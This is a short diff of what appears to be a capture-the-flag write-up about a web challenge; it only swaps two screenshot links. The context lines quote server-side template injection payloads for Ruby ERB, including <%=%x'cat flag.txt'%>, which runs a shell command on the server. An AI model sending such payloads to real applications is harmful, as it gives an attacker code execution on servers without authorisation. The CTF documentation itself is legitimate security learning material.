@@ -73,7 +73,7 @@ Content-Type: application/x-www-form-urlencoded
 neon=temp
 <%='cat flag.txt'%>
 ```
-![fail](img/fail1.png)
+![fail](img/fail.png)
 
 ---
 
@@ -91,7 +91,7 @@ neon=temp
 <%=%x'cat flag.txt'%>
 ```
 
-![fail](img/fail2.png)
+![flag](img/flag.png)
 
 ---
 
